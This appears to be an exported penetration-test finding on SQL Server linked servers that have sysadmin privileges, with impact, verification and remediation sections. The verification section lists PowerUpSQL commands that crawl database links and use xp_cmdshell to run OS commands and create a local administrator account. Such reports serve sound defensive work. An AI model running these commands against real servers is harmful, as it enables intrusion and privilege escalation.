{"default_url":null,"content":{"state":0,"taskInstructions":null,"references":[],"isTaskInstructionsVisible":true,"isCommentMandatory":false,"fields":[],"masterFinding":{"id":3389068,"exploitInstructions":"","verificationInstructions":"\n<h2>Variation: Standard Link Server Attack Chain</h2>\nThis assumes you have already have a valid SQL Server login.\n\n1. Import PowerUpSQL.\n\n<ncode><b>cmd.exe</b>\n<b>runas /netonly /user:addomain.com\\domain_user powershell_ise.exe</b>\n<b>Import-module PowerUpSQL.psd1</b>\n</ncode>\n\n2. List linked SQL Servers.\n\n<ncode><b>Get-SQLQuery -Verbose - Instance &quot;sqlserver\\instance1&quot; -Query &quot;SELECT &#42; FROM master..sysservers&quot;</b>\n</ncode>\nRaw Query\n<ncode><b>SELECT &#42; FROM master..sysservers</b>\n</ncode>\n\n3. Test access to link SQL Servers.\n\n<ncode><b>Get-SQLQuery -Verbose - Instance &quot;sqlserver\\instance1&quot; -Query &quot;select &#42; from openquery(&lt;LINKED_SERVER&gt;,'select is_srvrolemember(`''sysadmin`'')');&quot;</b> \n</ncode>\nRaw Query\n<ncode><b>select &#42; from openquery(&lt;LINKED_SERVER&gt;,'select is_srvrolemember(''sysadmin'')');</b>\n</ncode>\n4. Execute test query against remote links.\n\n<ncode><b>Get-SQLServerLinkCrawl -Verbose -Instance SQLServer1\\SQLEXPRESS -Query &quot;select @@SERVERNAME as Instance,name from master..sysdatabases where has_dbaccess(name) = 1&quot; | %{ $_.customquery} </b>\n\nInstance Linked Server Path                               Database Name                                                        \n---------------------------                               -------------                                                        \nSQLServer1\\SQLEXPRESS - &gt; LinkedServer4\\ISQLQ01           Projects\nSQLServer1\\SQLEXPRESS - &gt; LinkedServer2                   App1_Prod                                                    \nSQLServer1\\SQLEXPRESS - &gt; LinkedServer2                   App1_Dev                                                \nSQLServer1\\SQLEXPRESS - &gt; LinkedServer2                   Asset Database                                          \nSQLServer1\\SQLEXPRESS - &gt; LinkedServer2                   Asset Database                                      \nSQLServer1\\SQLEXPRESS - &gt; LinkedServer2                   Backup Database                                      \nSQLServer1\\SQLEXPRESS - &gt; LinkedServer3\\ISQLP01           Projects    \n</ncode>\n5. Execute commands through a link and create a local administrator.\n\n<ncode>&#35; Ping server\nGet-SQLServerLinkCrawl -Verbose -Instance SQLServer1\\SQLEXPRESS -Query &quot;select 1;exec master..xp_cmdshell 'ping 10.57.9.23'&quot;| %{ $_.customquery} \n\n&#35; Add local user\nGet-SQLServerLinkCrawl -Verbose -Instance SQLServer1\\SQLEXPRESS -Query &quot;select 1;exec master..xp_cmdshell 'net user netspi [REDACTED] /add'&quot;| %{ $_.customquery} \n\n&#35; Add local user to Administrator group\nGet-SQLServerLinkCrawl -Verbose -Instance SQLServer1\\SQLEXPRESS -Query &quot;select 1;exec master..xp_cmdshell 'net localgroup administrators /add netspi'&quot;| %{ $_.customquery} \n</ncode>\n \n<h2>Variation: Find Instances, Test Access, Map Links, and Generate a Pretty Csv</h2>\n1. Open cmd.exe and run as the a domain user.\n<ncode>cmd.exe\nrunas /netonly /user:addomain.com\\domain_user powershell_ise.exe\n</ncode>\n2. Download PowerUpSQL from powerupsql.com and import it into the PowerShell session.\n<ncode>Import-module PowerUpSQL.psd1\n</ncode>\n3. Get an inventory of all SQL Servers for the domain.\n<ncode>$DomainInstances = Get-SQLInstanceDomain -verbose -DomainController domaincomputer1.addomain.com -Username &quot;addomain.com\\domain_user&quot; -Password [REDACTED]\n</ncode>\n4. Attempt to connect to each instance and enumeration available SQL Server links and crawl them.\n<ncode>$SQLServerLinks = $DomainInstances | Get-SQLServerLinkCrawl -verbose\n</ncode>\n5. Parse results into pretty csv output.\n<ncode>$CsvResults = $SQLServerLinks |\nforeach {\n [string]$StringLinkPath = &quot;&quot;\n $Path = $_.path\n $PathCount = $Path.count - 1\n $LinkSrc = $Path[$PathCount - 1]\n $LinkDes = $Path[$PathCount]\n $LinkUser = $_.user\n $LinkDesSysadmin = $_.Sysadmin\n $Instance = $_.instance\n $LinkDesVersion = $_.Version\n $Path |\n foreach {\n if ( $StringLinkPath -eq &quot;&quot;){\n [string]$StringLinkPath = &quot;$_&quot;\n }else{\n [string]$StringLinkPath = &quot;$StringLinkPath -&gt; $_&quot;\n }\n }\n $Object = New-Object PSObject\n $Object | add-member Noteproperty LinkSrc $LinkSrc\n $Object | add-member Noteproperty LinkName $LinkDes\n $Object | add-member Noteproperty LinkInstance $Instance\n $Object | add-member Noteproperty LinkUser $LinkUser\n $Object | add-member Noteproperty LinkSysadmin $LinkDesSysadmin\n $Object | add-member Noteproperty LinkVersion $LinkDesVersion\n $Object | add-member Noteproperty LinkHops $PathCount\n $Object | add-member Noteproperty LinkPath $StringLinkPath\n $Object\n}\n$CsvResults | export-csv -NoTypeInformation addomain.com-SQL-ServerLinks.csv\n</ncode>\n6. Export results to CSV.\n<ncode>$CsvResults |  Export-Clixml c:\\temp\\links.xml \n</ncode>\n7. Graph results.\n\nReference:  https://www.netspi.com/blog/technical/network-penetration-testing/sql-server-link-crawling-powerupsql.\n\nThe exported XML file will then be parsed into a node file and link file so they can be imported into neo4j database. The following script will create the import files and it does provide the required <a href='https://neo4j.com/developer/cypher-query-language/'>Cypher</a> statements to create the graph. Obviously, all the file paths are hardcoded in PowerShell so those will have to be replaced if you run the script. And the last (optional) Cypher statements create a start node to indicate where the crawl started; the ServerId should be manually updated to point to the first SQL Server that was accessed. \n \n<ncode>$List = Import-CliXml 'C:\\temp\\links.xml'\n$Servers = $List | select name,version,path,user,sysadmin -unique | where name -ne 'broken link'\n$Outnodes = @()\n$Outpaths = @()\nforeach($Server <b>in</b> $Servers){\n   $Outnodes += &quot;$([string][math]::abs($Server.Name.GetHashCode())),$($Server.Name),$($Server.Version)&quot;\n<b>if</b>($Server.Path.Count -ne 1){\n       $Parentlink = $Server.Path[-2]\nforeach($a <b>in</b> $Servers){\n<b>if</b>(($a.Path[-1] -eq $Parentlink) -or ($a.Path -eq $Parentlink)){\n[string]$Parentname = $a.Name\n               break\n}\n}\n$Outpaths += &quot;$([math]::abs($Parentname.GetHashCode())),$([math]::abs($Server.Name.GetHashCode())),$($Server.User),$($Server.Sysadmin)&quot;\n}\n}\n$Outnodes | select -unique | out-file C:\\pathtoneo4j\\Neo4j\\default.graphdb\\Import\\nodes.txt\n$Outpaths | select -unique | out-file C:\\ pathtoneo4j \\default.graphdb\\Import\\links.txt\n\n&lt;&#35;\n[OPTIONAL] Cypher to clear the neo4j database:\nMATCH (n)\nOPTIONAL MATCH (n)-[r]-()\nDELETE n,r\n--\nCypher statement to create a neo4j graph - load nodes\nLOAD CSV FROM &quot;file:///nodes.txt&quot; AS row\nCREATE (:Server {ServerId: toInt(row[0]), Name:row[1], Version:row[2]});\n---\nCypher statement to create a neo4j graph - load links\nUSING PERIODIC COMMIT\nLOAD CSV FROM &quot;file:///links.txt&quot; AS row\nMATCH (p1:Server {ServerId: toInt(row[0])}), (p2:Server {ServerId: toInt(row[1])})\nCREATE (p1)-[:LINK {User: row[2], Sysadmin: row[3]}]-&gt;(p2);\n---\n[OPTIONAL] Cypher statement to create a start node which indicates where the crawl started. <b>This</b> is not automated; first node id must be filled <b>in</b> manually (i.e. replace 12345678 with the first node's id).\nCREATE (:Start {Id: 1})\n[OPTIONAL] Link start node to the first server\nMATCH (p1:Start {Id: 1}), (p2:Server {ServerId: 12345678})\nCREATE (p1)-[:START]-&gt;(p2);\n&#35;&gt;\n</ncode>\n\n","remediationInstructions":"If database links are not required for a defined business purpose they should be removed from the server.  If a database links is required, all login mappings should be configured using the principle of least privilege.  Database links should never be configured with sysadmin privileges.  \nThe default mapping for a linked server configuration is to emulate the current security credentials of the login. This kind of mapping is known as self-mapping. When a linked server is added by using sp_addlinkedserver, a default self-mapping is added for all local logins. If security account delegation is available and the linked server supports Windows Authentication, self-mapping for the Windows authenticated logins is supported.  Microsoft recommends using Windows Authentication as a best practice.\n\nLinked servers configured with sysadmin privileges can be identified with the following instructions:\n\n<b>List linked servers</b>\n<ncode>select &#42; from master..sysservers\n</ncode>\n\n<b>Test linked servers for sysadmin privileges</b>\n<ncode>select &#42; from openquery(&lt;LINKED_SERVER&gt;,'select is_srvrolemember(''sysadmin'')');\n</ncode>\n","name":"Excessive Privileges - SQL Server - Linked Server","sourceId":"M:3389068","severity":"Medium","businessImpact":"Attackers are able compromise the confidentiality, integrity and availability of each linked database server configured with sysadmin privileges.  The affected database links allow attackers to access sensitive data and execute arbitrary commands on the affected servers.","description":"At least one database link was discovered with a login mapping configured with excessive privileges.  A linked server configuration enables SQL Server to execute commands against OLE DB data sources on remote servers. \nLinked servers configured with least privilege support functionality:\n<ul><li>The ability to issue distributed queries, updates, commands, and transactions on heterogeneous data sources across the enterprise.</li>\n<li>The ability to address diverse data sources similarly.</li>\n<li>The ability to crawl database link chains.</li>\n</ul>\nLinked servers configured with excessive privilege support functionality:\n<ul><li>The ability to execute arbitrary commands on the operating system with the privileges of the SQL Server service account.</li>\n<li>The ability to read arbitrary files from operating system with the privileges of the SQL Server service account.</li>\n<li>The ability to issue distributed queries, updates, commands, and transactions on heterogeneous data sources across the enterprise.</li>\n<li>The ability to address diverse data sources similarly.</li>\n<li>The ability to crawl database link chains.</li>\n</ul>\n"}}}